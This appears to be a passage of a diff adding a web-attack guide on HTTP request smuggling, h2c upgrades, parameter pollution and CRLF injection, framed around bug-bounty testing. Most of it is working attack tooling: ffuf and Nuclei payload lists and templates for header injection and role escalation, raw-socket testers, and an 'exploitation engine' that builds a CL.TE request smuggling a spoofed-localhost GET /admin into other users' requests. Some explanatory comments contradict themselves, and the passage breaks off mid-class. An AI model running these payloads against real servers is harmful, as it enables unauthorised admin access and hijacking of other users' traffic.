+    python3 h2csmuggler.py \
+        --smuggle-through "$TARGET/" \
+        --target "${TARGET}${ep}" \
+        -X GET 2>/dev/null
+    sleep 1
+done
+```
+
+### h2c Detection Script (raw sockets)
+
+```python
+#!/usr/bin/env python3
+"""
+h2c_raw_detector.py — Raw socket h2c upgrade detection + CRLF injection test
+Tests if server supports h2c upgrade (cleartext HTTP/2), which enables
+a different class of request smuggling attacks.
+"""
+
+import socket
+import ssl
+import sys
+import time
+
+def banner():
+    print("""
+ ██╗  ██╗██████╗  ██████╗    ██████╗ ███████╗████████╗███████╗
+ ██║  ██║╚════██╗██╔════╝    ██╔══██╗██╔════╝╚══██╔══╝██╔════╝
+ ███████║ █████╔╝██║         ██║  ██║█████╗     ██║   ███████╗
+ ██╔══██║██╔═══╝ ██║         ██║  ██║██╔══╝     ██║   ╚════██║
+ ██║  ██║███████╗╚██████╗    ██████╔╝███████╗   ██║   ███████║
+ ╚═╝  ╚═╝╚══════╝ ╚═════╝    ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝
+    h2c Upgrade Detector + CRLF Injection Tester
+""")
+
+def make_socket(host, port, use_ssl=True):
+    sock = socket.create_connection((host, port), timeout=10)
+    if use_ssl:
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        sock = ctx.wrap_socket(sock, server_hostname=host)
+    return sock
+
+def test_h2c_upgrade(host, port, path="/"):
+    """
+    Send HTTP/1.1 Upgrade: h2c request.
+    RFC 7540 says server SHOULD respond 101 if it supports h2c.
+    """
+    # HTTP2-Settings is base64 of a minimal SETTINGS frame (empty)
+    upgrade_request = (
+        f"GET {path} HTTP/1.1\r\n"
+        f"Host: {host}\r\n"
+        f"Upgrade: h2c\r\n"
+        f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\n"
+        f"Connection: Upgrade, HTTP2-Settings\r\n"
+        f"\r\n"
+    ).encode()
+
+    print(f"\n[*] Sending h2c Upgrade request to {host}:{port}")
+    print(f"    Request bytes:\n")
+    # Show the CRLF structure explicitly
+    for line in upgrade_request.decode().split('\r\n'):
+        print(f"    {repr(line + chr(13) + chr(10))}")
+
+    try:
+        sock = make_socket(host, port)
+        sock.sendall(upgrade_request)
+        response = b""
+        sock.settimeout(8)
+        try:
+            while True:
+                chunk = sock.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+                if len(response) > 2000:
+                    break
+        except socket.timeout:
+            pass
+
+        response_str = response.decode('utf-8', errors='replace')
+        first_line = response_str.split('\r\n')[0] if response_str else "(no response)"
+
+        print(f"\n[*] Response first line: {first_line!r}")
+
+        if "101" in first_line:
+            print(f"[!!!] H2C UPGRADE ACCEPTED → VULNERABILITY CONFIRMED!")
+            print(f"      Server supports h2c, enabling HTTP/2 request smuggling")
+            return True
+        elif "400" in first_line:
+            print(f"[-] h2c rejected (400 Bad Request)")
+        elif "200" in first_line:
+            print(f"[-] Server ignored upgrade, returned 200")
+        else:
+            print(f"[-] Unexpected response: {first_line}")
+
+        sock.close()
+        return False
+
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return False
+
+def test_crlf_in_upgrade(host, port, path="/"):
+    """
+    Test CRLF injection within the h2c upgrade headers.
+    Inject \r\n into HTTP2-Settings to see if headers bleed.
+    """
+    # Inject CRLF into HTTP2-Settings value
+    crlf_payloads = [
+        # Standard CRLF after value
+        (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Upgrade: h2c\r\n"
+            f"HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA\r\nX-CRLF-Test: injected\r\n"
+            f"Connection: Upgrade\r\n"
+            f"\r\n"
+        ),
+        # CRLF in Upgrade value
+        (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Upgrade: h2c\r\nX-CRLF-Test: injected\r\n"
+            f"Connection: Upgrade\r\n"
+            f"\r\n"
+        ),
+    ]
+
+    print(f"\n[*] Testing CRLF injection in h2c headers...")
+    for i, payload in enumerate(crlf_payloads, 1):
+        print(f"\n    Payload {i}:")
+        for line in payload.split('\r\n'):
+            print(f"    | {line!r}")
+
+        try:
+            sock = make_socket(host, port)
+            sock.sendall(payload.encode())
+            response = b""
+            sock.settimeout(5)
+            try:
+                response = sock.recv(4096)
+            except socket.timeout:
+                pass
+
+            resp_str = response.decode('utf-8', errors='replace')
+            if 'X-CRLF-Test' in resp_str or 'injected' in resp_str.lower():
+                print(f"[!!!] CRLF INJECTION REFLECTED in response!")
+            else:
+                print(f"[-] No CRLF reflection detected")
+
+            sock.close()
+        except Exception as e:
+            print(f"[!] Error: {e}")
+
+if __name__ == "__main__":
+    banner()
+    if len(sys.argv) < 2:
+        print("Usage: python3 h2c_raw_detector.py <host> [port]")
+        sys.exit(1)
+
+    host = sys.argv[1]
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 443
+
+    if test_h2c_upgrade(host, port):
+        test_crlf_in_upgrade(host, port)
+```
+
+---
+
+## 6.9 ffuf — HPP & CRLF Fuzzing
+
+### Installation
+
+```bash
+go install github.com/ffuf/ffuf/v2@latest
+# or download binary
+wget -qO ffuf.tar.gz \
+  https://github.com/ffuf/ffuf/releases/latest/download/ffuf_2.1.0_linux_amd64.tar.gz
+tar -xzf ffuf.tar.gz && sudo mv ffuf /usr/local/bin/
+ffuf -V
+```
+
+### Complete Usage Reference
+
+```bash
+# ════════════════════════════════════════════════════
+# PARAMETER DISCOVERY (prerequisite for HPP)
+# ════════════════════════════════════════════════════
+
+# Discover GET params
+ffuf -u "https://target.com/api?FUZZ=test" \
+     -w ~/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt \
+     -fc 404 -mc all -v
+
+# Discover POST params
+ffuf -u "https://target.com/login" \
+     -X POST \
+     -d "FUZZ=test" \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -w params.txt \
+     -fc 400,404
+
+# Discover JSON keys
+ffuf -u "https://target.com/api" \
+     -X POST \
+     -d '{"FUZZ":"test"}' \
+     -H "Content-Type: application/json" \
+     -w params.txt \
+     -fc 400
+
+# ════════════════════════════════════════════════════
+# HPP FUZZING
+# ════════════════════════════════════════════════════
+
+# Fuzz second value of duplicate param
+ffuf -u "https://target.com/?role=user&role=FUZZ" \
+     -w ~/wordlists/hpp_values.txt \
+     -mc all -fc 200
+
+# Clusterbomb — fuzz both param name and value
+ffuf -u "https://target.com/?PARAM=normal&PARAM=EVIL" \
+     -w params.txt:PARAM \
+     -w values.txt:EVIL \
+     -mode clusterbomb \
+     -fc 400,404 \
+     -o hpp_results.json -of json
+
+# HPP in POST body (manual duplicate)
+ffuf -u "https://target.com/update" \
+     -X POST \
+     -d "role=user&role=FUZZ&username=alice" \
+     -w ~/wordlists/hpp_values.txt \
+     -H "Content-Type: application/x-www-form-urlencoded" \
+     -H "Cookie: session=abc123" \
+     -fr "Invalid\|Error\|Bad Request"
+
+# ════════════════════════════════════════════════════
+# CRLF FUZZING WITH FFUF
+# ════════════════════════════════════════════════════
+
+# Create CRLF payload wordlist
+cat > /tmp/crlf_payloads.txt << 'EOF'
+%0d%0aX-CRLF-Test: injected
+%0aX-CRLF-Test: injected
+%0d%0aSet-Cookie: admin=1
+%0d%0a%0d%0a<h1>CRLF</h1>
+%0D%0AX-CRLF-Test: injected
+%0d%0a X-CRLF-Test: injected
+%0d%0aContent-Length: 0%0d%0a%0d%0a
+\r\nX-CRLF-Test: injected
+%E5%98%8A%E5%98%8DX-CRLF-Test: injected
+%23%0d%0aX-CRLF-Test: injected
+%3f%0d%0aX-CRLF-Test: injected
+%0d%0aLocation: https://evil.com
+EOF
+
+# Fuzz URL params for CRLF
+ffuf -u "https://target.com/?redirect=https://safe.comFUZZ" \
+     -w /tmp/crlf_payloads.txt \
+     -mc all \
+     -mr "X-CRLF-Test" \
+     -v
+
+# Fuzz all parameters
+ffuf -u "https://target.com/?PARAM=https://safe.comFUZZ" \
+     -w params.txt:PARAM \
+     -w /tmp/crlf_payloads.txt:FUZZ \
+     -mode clusterbomb \
+     -mr "X-CRLF-Test|Set-Cookie.*admin"
+
+# ════════════════════════════════════════════════════
+# RESPONSE FILTERING FOR ANOMALY DETECTION
+# ════════════════════════════════════════════════════
+
+# Filter by response size (baseline = 1234)
+ffuf -u "https://target.com/?FUZZ=admin" \
+     -w params.txt \
+     -fs 1234
+
+# Match responses containing admin content
+ffuf -u "https://target.com/?role=user&role=FUZZ" \
+     -w ~/wordlists/hpp_values.txt \
+     -mr "admin\|dashboard\|panel\|Delete User"
+
+# Calibrate auto-filter
+ffuf -u "https://target.com/?FUZZ=test" \
+     -w params.txt \
+     -ac  # auto-calibrate
+
+# Rate limiting (bug bounty safe)
+ffuf -u "https://target.com/?FUZZ=test" \
+     -w params.txt \
+     -rate 5 \
+     -p 0.2
+```
+
+---
+
+## 6.10 httpx — Recon & HRS Candidate Finding
+
+### Installation
+
+```bash
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+```
+
+### Complete Usage for HRS Recon
+
+```bash
+# ── Basic probing ─────────────────────────────────────────────────
+cat targets.txt | httpx -title -status-code -web-server -tech-detect
+
+# ── Detect HTTP/2 (HRS downgrade attack surface) ──────────────────
+cat targets.txt | httpx -http2 -status-code -web-server
+
+# ── Get response headers (look for Via, X-Served-By, CF-Ray) ─────
+cat targets.txt | httpx \
+    -include-response-header \
+    -status-code \
+    -silent \
+    -o headers.txt
+
+# ── Filter for CDN/proxy-fronted targets ──────────────────────────
+cat targets.txt | httpx \
+    -match-string "via:\|x-served-by:\|cf-ray:\|x-amz-cf\|x-cache" \
+    -silent \
+    -o proxy_targets.txt
+
+# ── JSON output for programmatic parsing ─────────────────────────
+cat targets.txt | httpx \
+    -json \
+    -include-all-headers \
+    -status-code \
+    -web-server \
+    -tech-detect \
+    -http2 \
+    -o httpx_full.json
+
+# ── Find mismatched server stacks (nginx proxy + PHP backend) ─────
+cat targets.txt | httpx \
+    -json \
+    -web-server \
+    -tech-detect | \
+    python3 -c "
+import sys, json
+for line in sys.stdin:
+    try:
+        d = json.loads(line.strip())
+        srv = (d.get('webserver') or '').lower()
+        tech = [t.lower() for t in (d.get('technologies') or [])]
+        # nginx fronting PHP = potential HRS
+        if 'nginx' in srv and any('php' in t for t in tech):
+            print(f'[HRS CANDIDATE] {d[\"url\"]}  server={srv}  tech={tech}')
+    except: pass
+"
+
+# ── Extract all redirect chains ───────────────────────────────────
+cat targets.txt | httpx \
+    -follow-redirects \
+    -location \
+    -status-code \
+    -silent
+
+# ── Check specific HRS-related headers ────────────────────────────
+cat targets.txt | httpx \
+    -probe \
+    -include-response-header \
+    -silent | \
+    grep -i "transfer-encoding\|connection:\|keep-alive\|via:"
+
+# ── Fast bulk status check ────────────────────────────────────────
+cat targets.txt | httpx \
+    -silent \
+    -status-code \
+    -mc 200,301,302,403 \
+    -threads 50 \
+    -rate-limit 100 \
+    -o live_targets.txt
+```
+
+### httpx → HRS Candidate Filter Script
+
+```python
+#!/usr/bin/env python3
+# httpx_hrs_filter.py — Parse httpx JSON, score HRS risk
+# Usage: python3 httpx_hrs_filter.py httpx_full.json
+
+import json
+import sys
+
+PROXY_SIGNALS = [
+    'via', 'x-served-by', 'cf-ray', 'x-amz-cf-id',
+    'x-cache', 'x-varnish', 'x-forwarded-server',
+    'fastly-', 'akamai', 'x-cdn', 'x-proxy',
+    'x-backend', 'x-edge',
+]
+
+PROXY_SERVERS = [
+    'nginx', 'haproxy', 'varnish', 'squid', 'cloudflare',
+    'apache traffic server', 'envoy', 'traefik', 'caddy',
+    'aws', 'fastly', 'akamai',
+]
+
+results = []
+with open(sys.argv[1] if len(sys.argv) > 1 else "httpx_full.json") as f:
+    for line in f:
+        line = line.strip()
+        if not line:
+            continue
+        try:
+            entry = json.loads(line)
+        except json.JSONDecodeError:
+            continue
+
+        url     = entry.get("url", "")
+        server  = (entry.get("webserver") or "").lower()
+        tech    = [t.lower() for t in (entry.get("technologies") or [])]
+        headers = {k.lower(): v.lower()
+                   for k, v in (entry.get("headers") or {}).items()}
+        http2   = entry.get("http2", False)
+
+        score = 0
+        reasons = []
+
+        # Check proxy signal headers
+        for sig in PROXY_SIGNALS:
+            for hdr in headers:
+                if sig in hdr:
+                    score += 2
+                    reasons.append(f"header: {hdr}={headers[hdr][:40]}")
+
+        # Check proxy server type
+        for ps in PROXY_SERVERS:
+            if ps in server:
+                score += 3
+                reasons.append(f"server: {server}")
+                break
+
+        # HTTP/2 downgrade surface
+        if http2:
+            score += 2
+            reasons.append("http2 supported → downgrade attack surface")
+
+        # Mismatched stack
+        if "nginx" in server and any("php" in t for t in tech):
+            score += 4
+            reasons.append("nginx (proxy) + PHP (backend) — classic HRS setup")
+
+        if "apache" in server and any("node" in t for t in tech):
+            score += 3
+            reasons.append("apache (proxy) + Node.js — potential mismatch")
+
+        # Transfer-Encoding passthrough
+        if "transfer-encoding" in headers:
+            score += 1
+            reasons.append(f"TE header in response: {headers['transfer-encoding']}")
+
+        if score > 0:
+            results.append({
+                "url": url,
+                "score": score,
+                "server": server,
+                "http2": http2,
+                "reasons": reasons,
+            })
+
+results.sort(key=lambda x: x["score"], reverse=True)
+
+print(f"\n{'='*65}")
+print(f"  HRS CANDIDATE REPORT — {len(results)} targets")
+print(f"{'='*65}")
+for r in results:
+    print(f"\n  Score {r['score']:2d} | {'HTTP/2' if r['http2'] else '      '} | {r['url']}")
+    for reason in r['reasons']:
+        print(f"          → {reason}")
+
+# Write top candidates to file
+with open("hrs_candidates.txt", "w") as f:
+    for r in results:
+        f.write(r["url"] + "\n")
+print(f"\n[+] Saved to hrs_candidates.txt")
+```
+
+---
+
+## 6.11 Nuclei — Complete Guide
+
+### Installation & Templates
+
+```bash
+# Install
+go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+
+# Update templates
+nuclei -update-templates
+
+# List HRS templates
+nuclei -tl | grep -i "smuggl\|desync\|crlf\|hpp"
+
+# Template locations
+ls ~/.local/nuclei-templates/http/vulnerabilities/http-request-smuggling/
+ls ~/.local/nuclei-templates/http/vulnerabilities/crlf-injection/
+```
+
+### Full Command Reference
+
+```bash
+# ── Single target HRS scan ────────────────────────────────────────
+nuclei -u "https://target.com" \
+       -t http/vulnerabilities/http-request-smuggling/
+
+# ── Single target CRLF scan ───────────────────────────────────────
+nuclei -u "https://target.com" \
+       -t http/vulnerabilities/crlf-injection/
+
+# ── Both HRS + CRLF on target ────────────────────────────────────
+nuclei -u "https://target.com" \
+       -t http/vulnerabilities/http-request-smuggling/ \
+       -t http/vulnerabilities/crlf-injection/
+
+# ── Bulk scan from file ───────────────────────────────────────────
+nuclei -l targets.txt \
+       -t http/vulnerabilities/ \
+       -o nuclei_results.txt
+
+# ── Only high/critical severity ───────────────────────────────────
+nuclei -l targets.txt \
+       -t http/vulnerabilities/ \
+       -severity high,critical
+
+# ── With rate limiting (safe for bug bounty) ──────────────────────
+nuclei -l targets.txt \
+       -t http/vulnerabilities/http-request-smuggling/ \
+       -rate-limit 5 \
+       -timeout 20 \
+       -retries 1
+
+# ── JSON output for automation ────────────────────────────────────
+nuclei -l targets.txt \
+       -t http/vulnerabilities/ \
+       -json \
+       -o nuclei_results.json
+
+# ── Debug: show requests/responses ───────────────────────────────
+nuclei -u "https://target.com" \
+       -t http/vulnerabilities/http-request-smuggling/ \
+       -debug-req -debug-resp \
+       -v
+
+# ── Use custom templates directory ────────────────────────────────
+nuclei -u "https://target.com" \
+       -t ~/custom-nuclei-templates/
+
+# ── Exclude templates ────────────────────────────────────────────
+nuclei -l targets.txt \
+       -t http/vulnerabilities/ \
+       -exclude-tags "dos,timing" \
+       -o results.txt
+
+# ── Interactsh integration (for out-of-band detection) ────────────
+nuclei -u "https://target.com" \
+       -t http/vulnerabilities/ \
+       -iserver https://oast.pro
+
+# ── Proxy through Burp ────────────────────────────────────────────
+nuclei -u "https://target.com" \
+       -t http/vulnerabilities/http-request-smuggling/ \
+       -proxy "http://127.0.0.1:8080"
+
+# ── Full pipeline: katana crawl → nuclei scan ────────────────────
+katana -u "https://target.com" -depth 2 -silent | \
+  httpx -silent -status-code -mc 200 | \
+  awk '{print $1}' | \
+  nuclei -t http/vulnerabilities/ -rate-limit 3 -o results.txt
+```
+
+### Custom Nuclei Templates
+
+```yaml
+# custom-hpp-role-escalation.yaml
+id: hpp-role-escalation
+
+info:
+  name: HTTP Parameter Pollution - Role Escalation
+  severity: high
+  tags: hpp,logic,escalation
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?role=user&role=admin"
+      - "{{BaseURL}}?role=admin&role=user"
+      - "{{BaseURL}}?admin=0&admin=1"
+      - "{{BaseURL}}?type=user&type=admin"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "Admin Panel"
+          - "Delete User"
+          - "Manage Users"
+          - "Admin Dashboard"
+          - "administration"
+        case-insensitive: true
+      - type: status
+        status:
+          - 200
+        # Only interesting if previously got 403 on /admin
+```
+
+```yaml
+# custom-crlf-response-split.yaml
+id: crlf-response-splitting
+
+info:
+  name: CRLF Injection - Response Splitting
+  severity: high
+  description: |
+    Tests for CRLF injection that could enable HTTP response splitting,
+    cookie injection, XSS, or cache poisoning.
+  tags: crlf,injection,response-splitting
+
+variables:
+  marker: "crlftest{{randstr}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?url=https://safe.com%0d%0aX-Injected: {{marker}}"
+      - "{{BaseURL}}?redirect=https://safe.com%0aX-Injected: {{marker}}"
+      - "{{BaseURL}}?lang=en%0d%0aX-Injected: {{marker}}"
+      - "{{BaseURL}}?next=/%0d%0aX-Injected: {{marker}}"
+      - "{{BaseURL}}?ref=test%0D%0AX-Injected: {{marker}}"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: header
+        regex:
+          - "X-Injected: {{marker}}"
+        name: crlf-confirmed
+
+    extractors:
+      - type: kval
+        part: header
+        kval:
+          - x-injected
+```
+
+```yaml
+# custom-hrs-clte-detect.yaml
+id: hrs-clte-detection
+
+info:
+  name: HTTP Request Smuggling - CL.TE Detection
+  severity: critical
+  description: |
+    Sends a CL.TE timing probe. A delayed response (>5s) suggests
+    the back-end is waiting for chunked data that the front-end
+    already consumed — indicating CL.TE desync.
+  tags: hrs,smuggling,clte,timing
+
+http:
+  - raw:
+      - |
+        POST / HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding: chunked
+        
+        1
+        A
+        X
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+        name: timing-anomaly-5s
+
+    extractors:
+      - type: dsl
+        name: response-duration
+        dsl:
+          - "duration"
+```
+
+---
+
+## 6.12 Custom Python Scripts — Complete Library
+
+### Script 1: CRLF Injection Tester
+
+```python
+#!/usr/bin/env python3
+"""
+crlf_tester.py — Comprehensive CRLF injection tester
+Tests headers, cookies, log injection, response splitting.
+Usage: python3 crlf_tester.py -u https://target.com
+"""
+
+import requests
+import argparse
+import urllib.parse
+import sys
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+import urllib3
+urllib3.disable_warnings()
+
+CRLF_PAYLOADS = [
+    # Standard
+    "%0d%0a",
+    "%0a",
+    "%0D%0A",
+    # Double encoded
+    "%250d%250a",
+    "%250a",
+    # Unicode
+    "%u000d%u000a",
+    "\\r\\n",
+    # Multi-byte
+    "%E5%98%8A%E5%98%8D",
+    # With space
+    "%0d%0a%20",
+    "%0d%0a%09",
+    # Hash/question
+    "%23%0d%0a",
+    "%3f%0d%0a",
+    # Combinations
+    "%0d%0a%0d%0a",
+    "\r\n",
+]
+
+INJECTION_SUFFIXES = [
+    "X-CRLF-Test: crlf_injected",
+    "Set-Cookie: crlf_test=1; Path=/",
+    "Location: https://evil.com",
+    "Content-Type: text/html\r\n\r\n<h1>CRLF Split</h1>",
+]
+
+INJECTABLE_PARAMS = [
+    "redirect", "redirect_uri", "redirect_url",
+    "url", "next", "return", "return_url",
+    "ref", "referrer", "callback",
+    "lang", "language", "locale",
+    "page", "path", "location", "dest", "destination",
+    "q", "search", "query",
+    "host", "domain",
+]
+
+class CRLFTester:
+
+    def __init__(self, url, cookies=None, proxy=None, timeout=10):
+        self.base_url = url
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.max_redirects = 0
+        if cookies:
+            for pair in cookies.split(';'):
+                if '=' in pair:
+                    k, v = pair.strip().split('=', 1)
+                    self.session.cookies.set(k, v)
+        if proxy:
+            self.session.proxies = {'http': proxy, 'https': proxy}
+        self.timeout = timeout
+        self.findings = []
+
+    def test_param(self, param, crlf, suffix):
+        """Inject CRLF into a URL parameter and check response headers"""
+        payload = f"https://safe.com{crlf}{suffix}"
+        test_url = f"{self.base_url}?{param}={urllib.parse.quote(payload, safe='')}"
+
+        try:
+            resp = self.session.get(
+                test_url,
+                timeout=self.timeout,
+                allow_redirects=False,
+            )
+            # Check if injected header appears in response headers
+            for header_name, header_val in resp.headers.items():
+                if "crlf_injected" in header_val.lower() or \
+                   "crlf_test" in header_name.lower() or \
+                   "evil.com" in header_val.lower():
+                    return True, resp.status_code, \
+                           f"{header_name}: {header_val}"
+        except requests.exceptions.TooManyRedirects:
+            # Sometimes CRLF triggers a redirect loop
+            return False, "redirect", None
+        except Exception:
+            pass
+
+        return False, None, None
+
+    def run(self):
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"  CRLF INJECTION TESTER — {self.base_url}")
+        print(f"{'='*60}{Style.RESET_ALL}")
+
+        for param in INJECTABLE_PARAMS:
+            for crlf in CRLF_PAYLOADS:
+                for suffix in INJECTION_SUFFIXES:
+                    vuln, status, evidence = self.test_param(param, crlf, suffix)
+                    if vuln:
+                        msg = (f"\n{Fore.RED}[!!!] CRLF INJECTION CONFIRMED!\n"
+                               f"      Param:   {param}\n"
+                               f"      Payload: {crlf}\n"
+                               f"      Suffix:  {suffix}\n"
+                               f"      Status:  {status}\n"
+                               f"      Evidence: {evidence}{Style.RESET_ALL}")
+                        print(msg)
+                        self.findings.append({
+                            "param": param,
+                            "crlf": crlf,
+                            "suffix": suffix,
+                            "status": status,
+                            "evidence": evidence,
+                        })
+                    else:
+                        if "--verbose" in sys.argv:
+                            print(f"  [-] {param} + {crlf[:10]} → no injection")
+
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"  FINDINGS: {len(self.findings)}")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        return self.findings
+
+
+def main():
+    parser = argparse.ArgumentParser(description="CRLF Injection Tester")
+    parser.add_argument("-u", "--url", required=True)
+    parser.add_argument("--cookies", default=None)
+    parser.add_argument("--proxy", default=None)
+    parser.add_argument("--verbose", action="store_true")
+    args = parser.parse_args()
+
+    tester = CRLFTester(args.url, args.cookies, args.proxy)
+    tester.run()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Script 2: HRS Raw Socket Engine
+
+```python
+#!/usr/bin/env python3
+"""
+hrs_engine.py — Low-level HRS detection + exploitation engine
+Sends raw bytes with precise CRLF control for accurate testing.
+Usage: python3 hrs_engine.py -u https://target.com
+"""
+
+import socket
+import ssl
+import time
+import sys
+import argparse
+from colorama import Fore, Style, init
+
+init(autoreset=True)
+
+class HRSEngine:
+    """
+    All HTTP requests built byte-by-byte with explicit \r\n.
+    This is crucial: wrong CRLF = request rejected or not smuggled.
+    """
+
+    def __init__(self, host, port=443, use_ssl=True, timeout=15):
+        self.host = host
+        self.port = port
+        self.use_ssl = use_ssl
+        self.timeout = timeout
+
+    # ── Raw connection ─────────────────────────────────────────────
+
+    def connect(self):
+        sock = socket.create_connection((self.host, self.port),
+                                        timeout=self.timeout)
+        if self.use_ssl:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=self.host)
+        return sock
+
+    def send_recv(self, payload_bytes, label=""):
+        """Send bytes, receive response, return (response_str, elapsed_sec)"""
+        start = time.time()
+        try:
+            sock = self.connect()
+            sock.sendall(payload_bytes)
+            buf = b""
+            sock.settimeout(self.timeout)
+            try:
+                while True:
+                    chunk = sock.recv(4096)
+                    if not chunk:
+                        break
+                    buf += chunk
+                    if b"\r\n\r\n" in buf and len(buf) > 300:
+                        break
+            except socket.timeout:
+                pass
+            sock.close()
+            elapsed = time.time() - start
+            return buf.decode("utf-8", errors="replace"), elapsed
+        except Exception as e:
+            return f"ERROR: {e}", time.time() - start
+
+    # ── Request builders (explicit \r\n everywhere) ────────────────
+
+    def build_clte_timing(self):
+        """
+        CL.TE timing probe — explained byte by byte:
+
+        POST / HTTP/1.1\r\n           ← request line
+        Host: target\r\n              ← required Host header
+        Content-Length: 4\r\n         ← front-end reads 4 bytes of body
+        Transfer-Encoding: chunked\r\n← back-end uses TE (chunked)
+        \r\n                          ← blank line = end of headers
+
+        [BODY — 4 bytes as seen by front-end]
+        1\r\n                         ← chunk size = 1 (hex)  [byte 1-2 = "1\r"]
+        A\r\n                         ← chunk data "A"        [byte 3-4 = "\nA"]
+        X                             ← NOT a valid chunk size!
+
+        Front-end sees CL=4 → reads exactly "1\r\nA" (4 bytes) → sends to backend
+        Back-end sees TE:chunked → reads chunk "1" = 1 byte "A" → OK
+        Back-end now expects next chunk size → reads "X" → NOT valid hex!
+        Back-end HANGS waiting for valid chunk terminator
+        → Response timeout = CL.TE confirmed!
+        """
+        return (
+            b"POST / HTTP/1.1\r\n"
+            b"Host: " + self.host.encode() + b"\r\n"
+            b"Content-Type: application/x-www-form-urlencoded\r\n"
+            b"Content-Length: 4\r\n"
+            b"Transfer-Encoding: chunked\r\n"
+            b"\r\n"           # ← END OF HEADERS (double CRLF total)
+            b"1\r\n"          # ← chunk size = 1 byte
+            b"A\r\n"          # ← 1 byte of data
+            b"X"              # ← invalid chunk size → backend hangs
+        )
+
+    def build_tecl_timing(self):
+        """
+        TE.CL timing probe — explained:
+
+        Content-Length: 6\r\n    ← back-end reads 6 bytes of body
+        Transfer-Encoding: chunked\r\n ← front-end uses TE
+
+        Body:
+        0\r\n     ← chunk terminator (front-end: "end of body!")  [3 bytes]
+        \r\n      ← blank line after terminal chunk               [2 bytes]
+        X         ← extra byte                                    [1 byte]
+                    TOTAL = 6 bytes → matches CL
+
+        Front-end: TE → sees "0" terminator → sends to back-end ✓
+        Back-end: CL=6 → reads "0\r\n\r\nX" = 6 bytes → still wants more?
+        Wait: back-end reads CL=6 from the body perspective:
+          It sees body = "0\r\n\r\nX" and processes as raw body
+          It's WAITING for more bytes to fulfill CL=6
+          But front-end already forwarded all 6 bytes...
+        → Ambiguity → back-end hangs → timeout = TE.CL!
+        """
+        return (
+            b"POST / HTTP/1.1\r\n"
+            b"Host: " + self.host.encode() + b"\r\n"
+            b"Content-Type: application/x-www-form-urlencoded\r\n"
+            b"Content-Length: 6\r\n"
+            b"Transfer-Encoding: chunked\r\n"
+            b"\r\n"           # ← END OF HEADERS
+            b"0\r\n"          # ← terminal chunk [3 bytes]
+            b"\r\n"           # ← blank line after terminal chunk [2 bytes]
+            b"X"              # ← extra byte [1 byte] → CL=6 satisfied
+        )
+
+    def build_clte_exploit(self, smuggled_path="/admin",
+                            smuggled_host="localhost"):
+        """
+        CL.TE exploit — smuggle an admin request:
+
+        Body structure:
+        [terminal chunk "0\r\n\r\n"] + [smuggled request]
+
+        Content-Length covers the ENTIRE body (chunk + smuggled request)
+        Transfer-Encoding: chunked → front-end stops at "0" terminator
+        Back-end has leftover: entire smuggled request prefix
+
+        When next user's request arrives → it gets APPENDED to our smuggled prefix
+        → Back-end processes: [our smuggled GET /admin] + [user's body]
+        """
+        smuggled = (
+            f"GET {smuggled_path} HTTP/1.1\r\n"
+            f"Host: {smuggled_host}\r\n"
+            f"X-Forwarded-For: 127.0.0.1\r\n"
+            f"X-Real-IP: 127.0.0.1\r\n"
+            f"Content-Length: 10\r\n"
+            f"Connection: close\r\n"
+            f"\r\n"
+            f"smuggled=1"
+        ).encode()
+
+        # Terminal chunk + blank line + smuggled request
+        body = b"0\r\n\r\n" + smuggled
+        cl = len(body)
+
+        return (
+            b"POST / HTTP/1.1\r\n"
+            b"Host: " + self.host.encode() + b"\r\n"
+            b"Content-Type: application/x-www-form-urlencoded\r\n"
+            b"Content-Length: " + str(cl).encode() + b"\r\n"
+            b"Transfer-Encoding: chunked\r\n"
+            b"\r\n"           # ← END OF HEADERS
+            + body            # ← 0\r\n\r\n + smuggled request
+        )
+
+    def build_tete_probe(self, obfuscation="Transfer-Encoding: xchunked"):
+        """
+        TE.TE probe — uses obfuscated second TE header:
+
+        Two TE headers are sent:
+          Transfer-Encoding: chunked      ← front-end recognizes → uses TE
+          Transfer-Encoding: xchunked     ← back-end doesn't know "xchunked"
+                                            → ignores TE → falls back to CL
+
+        Result: front-end uses TE, back-end uses CL → same as TE.CL
+        Timing probe body: "0\r\n\r\nX" with CL=6
+        """
+        return (
+            b"POST / HTTP/1.1\r\n"
+            b"Host: " + self.host.encode() + b"\r\n"
+            b"Content-Type: application/x-www-form-urlencoded\r\n"
+            b"Content-Length: 6\r\n"
+            b"Transfer-Encoding: chunked\r\n"
+            + obfuscation.encode() + b"\r\n"   # ← second TE (obfuscated)
+            b"\r\n"
+            b"0\r\n"
+            b"\r\n"
+            b"X"
+        )
+
+    def build_normal(self, path="/"):
+        return (
+            b"GET " + path.encode() + b" HTTP/1.1\r\n"
+            b"Host: " + self.host.encode() + b"\r\n"
+            b"Connection: close\r\n"
+            b"\r\n"
+        )
+
+    def _status(self, resp):
+        line = resp.split("\n")[0] if resp else ""
+        parts = line.split()
+        return parts[1] if len(parts) >= 2 else "?"
+
